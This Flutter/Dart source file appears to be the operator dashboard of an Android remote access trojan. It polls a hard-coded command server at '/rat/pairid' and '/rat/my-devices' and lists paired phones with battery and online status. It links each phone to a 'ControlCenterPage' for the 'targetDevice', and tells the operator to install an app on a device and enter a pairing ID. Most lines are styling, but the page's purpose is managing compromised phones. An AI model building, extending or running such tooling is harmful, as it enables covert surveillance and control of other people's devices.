import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';
import 'dart:async';
import 'device_permission.dart';
import 'control_panel.dart';

const _kBase = 'https://eghatzy.rexypediaa.my.id:25565';

class DeviceDashboardPage extends StatefulWidget {
  final String username;
  final String role;
  final String sessionKey;
  const DeviceDashboardPage({
    super.key, 
    this.username = '', 
    this.role = '', 
    this.sessionKey = ''
  });
  @override State<DeviceDashboardPage> createState() => _DDState();
}

class _DDState extends State<DeviceDashboardPage> with SingleTickerProviderStateMixin {
  // ─── TEMA PREMIUM NEON BLUE ───
  static const Color bg = Color(0xFF060B18);
  static const Color bgCard = Color(0xFF0D1A2D);
  static const Color bgCardHover = Color(0xFF142A42);
  static const Color borderColor = Color(0xFF1A3A5A);
  static const Color primary = Color(0xFF00D4FF);
  static const Color primaryDark = Color(0xFF0099CC);
  static const Color primaryLight = Color(0xFF66E8FF);
  static const Color textPrimary = Color(0xFFF0F8FF);
  static const Color textSecondary = Color(0xFF8AB4D6);
  static const Color textMuted = Color(0xFF4A6A8A);
  static const Color success = Color(0xFF00E676);
  static const Color warning = Color(0xFFFFD54F);
  static const Color danger = Color(0xFFFF5252);
  
  List<dynamic> _devices = [];
  bool _loading = true;
  String? _errorMsg;
  String _pairId = '';
  bool get _isOwner => widget.role.toLowerCase() == 'owner';
  PermissionResult? _permission;
  Timer? _timer;
  late AnimationController _pulseController;
  late AnimationController _glowController;
  late Animation<double> _glowAnim;
  
  String _searchQuery = '';
  bool _showOnlineOnly = false;

  @override
  void initState() {
    super.initState();
    _pulseController = AnimationController(
      duration: const Duration(seconds: 2),
      vsync: this,
    )..repeat(reverse: true);
    
    _glowController = AnimationController(
      duration: const Duration(milliseconds: 1500),
      vsync: this,
    )..repeat(reverse: true);
    _glowAnim = Tween<double>(begin: 0.3, end: 0.8).animate(
      CurvedAnimation(parent: _glowController, curve: Curves.easeInOut),
    );
    
    _loadAll();
    _timer = Timer.periodic(const Duration(seconds: 15), (_) => _loadAll());
  }

  @override
  void dispose() {
    _timer?.cancel();
    _pulseController.dispose();
    _glowController.dispose();
    super.dispose();
  }

  Future<void> _loadAll() async {
    if (!mounted) return;
    try {
      setState(() => _loading = true);
      
      final pRes = await http
          .get(Uri.parse('$_kBase/rat/pairid?key=${widget.sessionKey}'))
          .timeout(const Duration(seconds: 8));
          
      if (pRes.statusCode == 200) {
        final pd = jsonDecode(pRes.body);
        if (pd['valid'] == true && pd['pairId'] != null) {
          if (mounted) setState(() => _pairId = pd['pairId'].toString());
        }
      }

      final dRes = await http
          .get(Uri.parse('$_kBase/rat/my-devices?key=${widget.sessionKey}'))
          .timeout(const Duration(seconds: 10));

      if (!mounted) return;
      
      if (dRes.statusCode != 200) {
        setState(() { 
          _loading = false; 
          _errorMsg = 'Server error'; 
        });
        return;
      }

      final body = jsonDecode(dRes.body);
      if (body['valid'] != true) {
        setState(() { 
          _loading = false; 
          _errorMsg = body['message'] ?? 'Invalid session'; 
        });
        return;
      }

      List<dynamic> devices = List<dynamic>.from(body['devices'] ?? []);
      final now = DateTime.now();
      
      for (var d in devices) {
        try {
          final seen = DateTime.parse(d['lastSeen']?.toString() ?? '');
          d['online'] = now.difference(seen).inSeconds < 30;
        } catch (_) { d['online'] = false; }
      }

      PermissionResult perm;
      if (_isOwner) {
        perm = PermissionResult(approved: true, allDevices: true, devices: []);
      } else {
        perm = await DevicePermissionStore.getFor(widget.username, widget.sessionKey);
      }

      if (mounted) setState(() {
        _devices = devices;
        _permission = perm;
        _loading = false;
        _errorMsg = null;
      });
    } catch (e) {
      if (mounted) setState(() { 
        _loading = false; 
        _errorMsg = 'Connection error'; 
      });
    }
  }

  int get _activeCount => _devices.where((d) => d['online'] == true).length;
  
  List<dynamic> get _filteredDevices {
    var list = _devices;
    if (_showOnlineOnly) {
      list = list.where((d) => d['online'] == true).toList();
    }
    if (_searchQuery.isNotEmpty) {
      list = list.where((d) {
        final model = (d['model']?.toString() ?? '').toLowerCase();
        final id = (d['id']?.toString() ?? '').toLowerCase();
        final query = _searchQuery.toLowerCase();
        return model.contains(query) || id.contains(query);
      }).toList();
    }
    return list;
  }

  void _copyPairId() {
    if (_pairId.isEmpty) return;
    Clipboard.setData(ClipboardData(text: _pairId));
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Row(
          children: const [
            Icon(Icons.check_circle, color: Colors.white, size: 18),
            SizedBox(width: 10),
            Text('Pairing ID copied!', style: TextStyle(fontWeight: FontWeight.w600)),
          ],
        ),
        backgroundColor: primary,
        behavior: SnackBarBehavior.floating,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16)),
        margin: const EdgeInsets.all(16),
        duration: const Duration(seconds: 2),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    final denied = _permission != null && !_permission!.approved && !_isOwner;
    final filtered = _filteredDevices;

    return Scaffold(
      backgroundColor: bg,
      body: Container(
        decoration: BoxDecoration(
          gradient: LinearGradient(
            begin: Alignment.topCenter,
            end: Alignment.bottomCenter,
            colors: [
              bg,
              const Color(0xFF080E1E),
              bg,
            ],
          ),
        ),
        child: SafeArea(
          child: Column(
            children: [
              _buildHeader(),
              if (_errorMsg != null) _buildBanner(Icons.error_outline, _errorMsg!, danger),
              if (denied && _errorMsg == null) 
                _buildBanner(Icons.lock_outline, 'Access pending approval', warning),
              if (!_isOwner && !denied && _errorMsg == null && _permission != null && _permission!.approved)
                _buildBanner(Icons.verified, 'Access granted ✓', success),
              _buildToolbar(),
              Expanded(
                child: _loading
                    ? _buildLoadingState()
                    : filtered.isEmpty
                        ? _buildEmptyState(denied)
                        : _buildDeviceGrid(filtered),
              ),
            ],
          ),
        ),
      ),
    );
  }

  // ─── HEADER ───
  Widget _buildHeader() {
    return Container(
      padding: const EdgeInsets.fromLTRB(20, 16, 20, 14),
      decoration: BoxDecoration(
        border: Border(
          bottom: BorderSide(
            color: primary.withOpacity(0.1),
            width: 1,
          ),
        ),
      ),
      child: Column(
        children: [
          Row(
            children: [
              AnimatedBuilder(
                animation: _glowAnim,
                builder: (context, child) {
                  return Container(
                    padding: const EdgeInsets.all(10),
                    decoration: BoxDecoration(
                      gradient: LinearGradient(
                        colors: [primary, primaryDark],
                      ),
                      borderRadius: BorderRadius.circular(14),
                      boxShadow: [
                        BoxShadow(
                          color: primary.withOpacity(_glowAnim.value),
                          blurRadius: 20,
                          spreadRadius: 4,
                        ),
                      ],
                    ),
                    child: const Icon(Icons.dashboard_customize_rounded, color: Colors.white, size: 20),
                  );
                },
              ),
              const SizedBox(width: 14),
              Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  ShaderMask(
                    shaderCallback: (bounds) => LinearGradient(
                      colors: [primary, primaryLight, primary],
                    ).createShader(bounds),
                    child: const Text(
                      'DEVICE HUB',
                      style: TextStyle(
                        color: Colors.white,
                        fontSize: 16,
                        fontWeight: FontWeight.bold,
                        letterSpacing: 2,
                      ),
                    ),
                  ),
                  Text(
                    '${widget.username} • ${_isOwner ? "Admin" : "Member"}',
                    style: TextStyle(
                      color: textSecondary,
                      fontSize: 11,
                      fontWeight: FontWeight.w500,
                    ),
                  ),
                ],
              ),
              const Spacer(),
              _buildStatChip('ONLINE', '$_activeCount', success),
              const SizedBox(width: 8),
              _buildStatChip('TOTAL', '${_devices.length}', primary),
            ],
          ),
          if (_pairId.isNotEmpty) ...[
            const SizedBox(height: 12),
            _buildPairIdCard(),
          ],
        ],
      ),
    );
  }

  Widget _buildPairIdCard() {
    return GestureDetector(
      onTap: _copyPairId,
      child: AnimatedContainer(
        duration: const Duration(milliseconds: 300),
        padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 10),
        decoration: BoxDecoration(
          gradient: LinearGradient(
            begin: Alignment.topLeft,
            end: Alignment.bottomRight,
            colors: [
              primary.withOpacity(0.06),
              primaryDark.withOpacity(0.03),
            ],
          ),
          borderRadius: BorderRadius.circular(16),
          border: Border.all(color: primary.withOpacity(0.15)),
        ),
        child: Row(
          children: [
            Container(
              padding: const EdgeInsets.all(8),
              decoration: BoxDecoration(
                color: primary.withOpacity(0.1),
                borderRadius: BorderRadius.circular(10),
              ),
              child: Icon(Icons.link_rounded, color: primary, size: 16),
            ),
            const SizedBox(width: 12),
            Expanded(
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Text(
                    'PAIRING ID',
                    style: TextStyle(
                      color: textMuted,
                      fontSize: 8,
                      letterSpacing: 2,
                      fontWeight: FontWeight.w600,
                    ),
                  ),
                  Text(
                    _pairId,
                    style: TextStyle(
                      color: primary,
                      fontSize: 16,
                      fontWeight: FontWeight.bold,
                      letterSpacing: 3,
                      fontFamily: 'monospace',
                    ),
                  ),
                ],
              ),
            ),
            Container(
              padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
              decoration: BoxDecoration(
                color: primary.withOpacity(0.1),
                borderRadius: BorderRadius.circular(20),
                border: Border.all(color: primary.withOpacity(0.2)),
              ),
              child: Row(
                children: [
                  Icon(Icons.copy_rounded, color: primary, size: 14),
                  const SizedBox(width: 4),
                  Text(
                    'COPY',
                    style: TextStyle(
                      color: primary,
                      fontSize: 9,
                      fontWeight: FontWeight.bold,
                      letterSpacing: 1,
                    ),
                  ),
                ],
              ),
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildStatChip(String label, String value, Color color) {
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 5),
      decoration: BoxDecoration(
        color: color.withOpacity(0.08),
        borderRadius: BorderRadius.circular(20),
        border: Border.all(color: color.withOpacity(0.15)),
      ),
      child: Row(
        children: [
          Container(
            width: 5,
            height: 5,
            decoration: BoxDecoration(
              color: color,
              shape: BoxShape.circle,
              boxShadow: [
                BoxShadow(
                  color: color.withOpacity(0.5),
                  blurRadius: 4,
                ),
              ],
            ),
          ),
          const SizedBox(width: 6),
          Text(
            '$label $value',
            style: TextStyle(
              color: color,
              fontSize: 9,
              fontWeight: FontWeight.bold,
              letterSpacing: 0.5,
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildBanner(IconData icon, String msg, Color color) {
    return Container(
      margin: const EdgeInsets.fromLTRB(16, 8, 16, 0),
      padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 10),
      decoration: BoxDecoration(
        color: color.withOpacity(0.06),
        borderRadius: BorderRadius.circular(12),
        border: Border.all(color: color.withOpacity(0.12)),
      ),
      child: Row(
        children: [
          Icon(icon, color: color, size: 16),
          const SizedBox(width: 10),
          Expanded(
            child: Text(
              msg,
              style: TextStyle(
                color: color,
                fontSize: 11,
                fontWeight: FontWeight.w500,
              ),
            ),
          ),
        ],
      ),
    );
  }

  // ─── TOOLBAR ───
  Widget _buildToolbar() {
    return Padding(
      padding: const EdgeInsets.fromLTRB(16, 10, 16, 8),
      child: Row(
        children: [
          Expanded(
            child: Container(
              height: 38,
              decoration: BoxDecoration(
                color: bgCard,
                borderRadius: BorderRadius.circular(14),
                border: Border.all(color: borderColor.withOpacity(0.3)),
              ),
              child: Row(
                children: [
                  const SizedBox(width: 12),
                  Icon(Icons.search_rounded, color: textMuted, size: 18),
                  const SizedBox(width: 8),
                  Expanded(
                    child: TextField(
                      style: const TextStyle(color: textPrimary, fontSize: 13),
                      decoration: const InputDecoration(
                        hintText: 'Search device...',
                        hintStyle: TextStyle(color: textMuted, fontSize: 12),
                        border: InputBorder.none,
                        isDense: true,
                      ),
                      onChanged: (v) => setState(() => _searchQuery = v),
                    ),
                  ),
                  if (_searchQuery.isNotEmpty)
                    GestureDetector(
                      onTap: () => setState(() => _searchQuery = ''),
                      child: Padding(
                        padding: const EdgeInsets.all(8),
                        child: Icon(Icons.close_rounded, color: textMuted, size: 16),
                      ),
                    ),
                ],
              ),
            ),
          ),
          const SizedBox(width: 8),
          _buildFilterButton(),
          const SizedBox(width: 8),
          _buildRefreshButton(),
          if (_isOwner) ...[
            const SizedBox(width: 8),
            _buildAccessButton(),
          ],
        ],
      ),
    );
  }

  Widget _buildFilterButton() {
    return GestureDetector(
      onTap: () => setState(() => _showOnlineOnly = !_showOnlineOnly),
      child: AnimatedContainer(
        duration: const Duration(milliseconds: 300),
        height: 38,
        padding: const EdgeInsets.symmetric(horizontal: 12),
        decoration: BoxDecoration(
          color: _showOnlineOnly ? success.withOpacity(0.12) : bgCard,
          borderRadius: BorderRadius.circular(14),
          border: Border.all(
            color: _showOnlineOnly ? success.withOpacity(0.3) : borderColor.withOpacity(0.3),
          ),
        ),
        child: Row(
          children: [
            Icon(
              _showOnlineOnly ? Icons.radio_button_checked : Icons.radio_button_off,
              color: _showOnlineOnly ? success : textMuted,
              size: 16,
            ),
            const SizedBox(width: 6),
            Text(
              'ONLINE',
              style: TextStyle(
                color: _showOnlineOnly ? success : textMuted,
                fontSize: 10,
                fontWeight: FontWeight.w600,
                letterSpacing: 0.5,
              ),
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildRefreshButton() {
    return GestureDetector(
      onTap: () => _loadAll(),
      child: AnimatedContainer(
        duration: const Duration(milliseconds: 300),
        height: 38,
        width: 38,
        decoration: BoxDecoration(
          color: bgCard,
          borderRadius: BorderRadius.circular(14),
          border: Border.all(color: borderColor.withOpacity(0.3)),
        ),
        child: Icon(Icons.refresh_rounded, color: textSecondary, size: 20),
      ),
    );
  }

  Widget _buildAccessButton() {
    return GestureDetector(
      onTap: () async {
        await Navigator.push(context, MaterialPageRoute(
          builder: (_) => DevicePermissionManagerPage(
            sessionKey: widget.sessionKey, 
            allDevices: _devices,
          ),
        ));
        _loadAll();
      },
      child: Container(
        height: 38,
        padding: const EdgeInsets.symmetric(horizontal: 14),
        decoration: BoxDecoration(
          gradient: LinearGradient(
            colors: [primary, primaryDark],
          ),
          borderRadius: BorderRadius.circular(14),
          boxShadow: [
            BoxShadow(
              color: primary.withOpacity(0.3),
              blurRadius: 12,
              spreadRadius: 2,
            ),
          ],
        ),
        child: Row(
          children: const [
            Icon(Icons.manage_accounts_rounded, color: Colors.white, size: 16),
            SizedBox(width: 6),
            Text(
              'ACCESS',
              style: TextStyle(
                color: Colors.white,
                fontSize: 10,
                fontWeight: FontWeight.bold,
                letterSpacing: 0.5,
              ),
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildLoadingState() {
    return Center(
      child: Column(
        mainAxisAlignment: MainAxisAlignment.center,
        children: [
          AnimatedBuilder(
            animation: _pulseController,
            builder: (context, child) {
              return Transform.scale(
                scale: _pulseController.value,
                child: Container(
                  width: 50,
                  height: 50,
                  decoration: BoxDecoration(
                    shape: BoxShape.circle,
                    gradient: LinearGradient(
                      colors: [primary.withOpacity(0.2), primaryDark.withOpacity(0.1)],
                    ),
                    border: Border.all(
                      color: primary.withOpacity(0.3),
                      width: 2,
                    ),
                  ),
                  child: const CircularProgressIndicator(
                    valueColor: AlwaysStoppedAnimation(primary),
                    strokeWidth: 3,
                  ),
                ),
              );
            },
          ),
          const SizedBox(height: 16),
          Text(
            'Loading devices...',
            style: TextStyle(color: textSecondary, fontSize: 12, letterSpacing: 1),
          ),
        ],
      ),
    );
  }

  Widget _buildEmptyState(bool denied) {
    return Center(
      child: Column(
        mainAxisSize: MainAxisSize.min,
        children: [
          Container(
            padding: const EdgeInsets.all(32),
            decoration: BoxDecoration(
              color: bgCard,
              shape: BoxShape.circle,
              boxShadow: [
                BoxShadow(
                  color: primary.withOpacity(0.05),
                  blurRadius: 40,
                ),
              ],
            ),
            child: Icon(
              denied ? Icons.lock_rounded : Icons.devices_other_rounded,
              color: textMuted,
              size: 56,
            ),
          ),
          const SizedBox(height: 24),
          Text(
            denied ? 'ACCESS DENIED' : 'NO DEVICES',
            style: TextStyle(
              color: textPrimary,
              fontSize: 18,
              fontWeight: FontWeight.bold,
              letterSpacing: 3,
            ),
          ),
          const SizedBox(height: 8),
          Text(
            denied ? 'Contact admin to request access' : 'Connect your first device',
            style: TextStyle(color: textSecondary, fontSize: 13),
          ),
          if (!denied) ...[
            const SizedBox(height: 28),
            Container(
              margin: const EdgeInsets.symmetric(horizontal: 32),
              padding: const EdgeInsets.all(20),
              decoration: BoxDecoration(
                gradient: LinearGradient(
                  colors: [primary.withOpacity(0.04), primaryDark.withOpacity(0.02)],
                ),
                borderRadius: BorderRadius.circular(20),
                border: Border.all(color: primary.withOpacity(0.08)),
              ),
              child: Column(
                children: [
                  Icon(Icons.info_outline_rounded, color: primary, size: 24),
                  const SizedBox(height: 12),
                  const Text(
                    'HOW TO CONNECT',
                    style: TextStyle(
                      color: textPrimary,
                      fontSize: 12,
                      fontWeight: FontWeight.bold,
                      letterSpacing: 1.5,
                    ),
                  ),
                  const SizedBox(height: 10),
                  Text(
                    '1. Install app on device\n'
                    '2. Enter Pairing ID above\n'
                    '3. Device appears here',
                    style: TextStyle(
                      color: textSecondary,
                      fontSize: 12,
                      height: 1.8,
                    ),
                    textAlign: TextAlign.center,
                  ),
                ],
              ),
            ),
          ],
        ],
      ),
    );
  }

  // ─── DEVICE GRID ───
  Widget _buildDeviceGrid(List<dynamic> devices) {
    return GridView.builder(
      padding: const EdgeInsets.fromLTRB(16, 4, 16, 100),
      gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
        crossAxisCount: 3,
        crossAxisSpacing: 12,
        mainAxisSpacing: 12,
        childAspectRatio: 0.65,
      ),
      itemCount: devices.length,
      itemBuilder: (ctx, i) {
        final d = devices[i];
        final online = d['online'] == true;
        final statusColor = online ? success : danger;
        final battery = (d['battery'] ?? 0).toString();
        final model = d['model']?.toString() ?? 'Unknown';
        final deviceId = d['id']?.toString() ?? '-';
        
        return GestureDetector(
          onTap: () => Navigator.push(ctx, MaterialPageRoute(
            builder: (_) => ControlCenterPage(
              targetDevice: d,
              role: widget.role,
            ),
          )),
          child: AnimatedContainer(
            duration: const Duration(milliseconds: 400),
            padding: const EdgeInsets.all(14),
            decoration: BoxDecoration(
              gradient: LinearGradient(
                begin: Alignment.topLeft,
                end: Alignment.bottomRight,
                colors: [
                  online ? bgCardHover : bgCard,
                  bg,
                ],
              ),
              borderRadius: BorderRadius.circular(18),
              border: Border.all(
                color: online ? primary.withOpacity(0.3) : borderColor.withOpacity(0.3),
                width: online ? 1.5 : 1,
              ),
              boxShadow: online ? [
                BoxShadow(
                  color: primary.withOpacity(0.06),
                  blurRadius: 20,
                  spreadRadius: 2,
                ),
              ] : null,
            ),
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Row(
                  mainAxisAlignment: MainAxisAlignment.spaceBetween,
                  children: [
                    Icon(Icons.phone_android_rounded, color: online ? primary : textMuted, size: 20),
                    Container(
                      padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 3),
                      decoration: BoxDecoration(
                        color: statusColor.withOpacity(0.08),
                        borderRadius: BorderRadius.circular(10),
                        border: Border.all(color: statusColor.withOpacity(0.15)),
                      ),
                      child: Row(
                        children: [
                          AnimatedContainer(
                            duration: const Duration(milliseconds: 800),
                            width: 6,
                            height: 6,
                            decoration: BoxDecoration(
                              color: statusColor,
                              shape: BoxShape.circle,
                              boxShadow: online ? [
                                BoxShadow(
                                  color: statusColor.withOpacity(0.6),
                                  blurRadius: 8,
                                  spreadRadius: 2,
                                ),
                              ] : null,
                            ),
                          ),
                          const SizedBox(width: 5),
                          Text(
                            online ? 'ONLINE' : 'OFFLINE',
                            style: TextStyle(
                              color: statusColor,
                              fontSize: 8,
                              fontWeight: FontWeight.bold,
                              letterSpacing: 0.5,
                            ),
                          ),
                        ],
                      ),
                    ),
                  ],
                ),
                const Spacer(),
                Text(
                  model,
                  style: TextStyle(
                    color: textPrimary,
                    fontSize: 13,
                    fontWeight: FontWeight.w600,
                  ),
                  maxLines: 1,
                  overflow: TextOverflow.ellipsis,
                ),
                const SizedBox(height: 2),
                Text(
                  deviceId,
                  style: TextStyle(
                    color: textMuted,
                    fontSize: 9,
                    fontFamily: 'monospace',
                  ),
                  maxLines: 1,
                  overflow: TextOverflow.ellipsis,
                ),
                const Spacer(),
                Row(
                  children: [
                    Icon(Icons.battery_charging_full_rounded, color: textMuted, size: 14),
                    const SizedBox(width: 4),
                    Text(
                      '$battery%',
                      style: TextStyle(
                        color: textSecondary,
                        fontSize: 10,
                        fontWeight: FontWeight.w500,
                      ),
                    ),
                    const Spacer(),
                    Container(
                      padding: const EdgeInsets.all(4),
                      decoration: BoxDecoration(
                        color: primary.withOpacity(0.08),
                        borderRadius: BorderRadius.circular(8),
                      ),
                      child: Icon(
                        Icons.chevron_right_rounded,
                        color: primary,
                        size: 18,
                      ),
                    ),
                  ],
                ),
              ],
            ),
          ),
        );
      },
    );
  }
}